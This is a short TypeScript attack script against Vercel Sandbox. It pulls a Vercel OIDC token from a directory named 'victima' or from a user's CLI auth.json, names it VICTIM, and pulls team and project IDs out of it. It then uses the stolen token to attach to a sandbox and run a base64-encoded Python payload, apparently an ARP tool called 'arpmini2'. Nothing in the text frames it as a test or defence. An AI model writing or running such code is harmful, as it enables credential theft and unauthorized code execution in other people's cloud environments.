import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";
const B64 = readFileSync("/tmp/arpmini2.b64","utf8").trim();
async function main() {
  const name = process.argv[2] ?? "arp-1787262065357";
  const sbx = await Sandbox.get({ name, token: VICTIM, teamId, projectId });
  const SCRIPT = "set +e; echo $$ > /tmp/run.pid; base64 -d > /tmp/arpmini2.py <<'EOF'\n" + B64 + "\nEOF\npython3 /tmp/arpmini2.py";
  const r = await sbx.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 120_000 });
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
